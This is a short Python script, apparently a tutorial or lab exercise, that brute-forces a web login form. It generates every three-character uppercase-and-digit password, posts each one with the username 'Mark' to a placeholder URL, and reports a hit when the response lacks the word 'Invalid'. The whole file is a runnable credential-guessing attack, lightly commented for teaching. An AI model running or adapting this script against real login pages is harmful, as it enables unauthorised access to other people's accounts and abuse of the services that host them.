"""
Brute-force script for alphanumeric passwords.

- Generates combinations using uppercase letters and digits
- Uses itertools.product to simulate nested loops
- Attempts login requests until valid credentials are found
"""
import requests
import string
import itertools

# -- any login request consists of:
# -- URL + data (username + password)
url = "http://target-url"

username = "Mark"

# -- define password generation settings

# 1. determine character set (A-Z + 0-9)
chars = string.ascii_uppercase + string.digits

# 2. determine password length
length = 3

def brute_force():
    # 3. generate passwords and start brute forcing
    for p in itertools.product(chars, repeat=length):
        # convert tuple → string
        password = ''.join(p)

        # now we prepare a candidate password to attempt login
        data = {
            "username": username,
            "password": password
        }
        
        response = requests.post(url, data=data)

        # check if login is successful
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")


if __name__ == "__main__":
    brute_force()